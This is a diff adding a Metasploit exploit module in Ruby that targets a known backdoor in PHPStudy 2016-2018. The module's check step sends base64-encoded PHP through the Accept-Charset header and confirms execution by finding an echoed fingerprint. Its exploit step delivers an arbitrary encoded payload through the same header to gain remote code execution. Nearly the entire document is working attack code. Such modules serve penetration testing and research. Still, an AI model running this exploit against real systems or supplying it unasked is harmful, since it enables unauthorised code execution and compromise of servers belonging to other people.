@@ -1,0 +1,73 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "PHPStudy Backdoor Remote Code execution",
+      'Description'    => %q{
+        This module can detect and exploit the backdoor of PHPStudy.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Dimensional',  #POC
+          'Airevan'       #Metasploit Module
+        ],
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          ['PHPStudy 2016-2018', {}]
+        ],
+      'References'    =>
+        [
+          ['URL', 'https://programmer.group/using-ghidra-to-analyze-the-back-door-of-phpstudy.html']
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "Sep 20 2019",
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path', '/'])
+      ])
+  end
+  def check
+    uri = target_uri.path
+    fingerprint = Rex::Text.rand_text_alpha(8)
+    res = send_request_cgi({
+      'method'  =>  'GET',
+      'uri'     =>  normalize_uri(uri, 'index.php'),
+      'headers' =>  {
+        'Accept-Encoding' =>  'gzip,deflate',
+        'Accept-Charset'  =>  Rex::Text.encode_base64("echo '#{fingerprint}';")
+      }
+    })
+
+    if res && res.code == 200 && res.body.to_s.include?(fingerprint)
+      return Exploit::CheckCode::Appears
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+  def exploit
+    uri = target_uri.path
+    print_good("Sending shellcode")
+    res = send_request_cgi({
+      'method'  => 'GET',
+      'uri'     => normalize_uri(uri, 'index.php'),
+      'headers' => {
+          'Accept-Encoding' => 'gzip,deflate',
+          'Accept-Charset'  => Rex::Text.encode_base64(payload.encoded)
+      }
+  })
+  end
+end
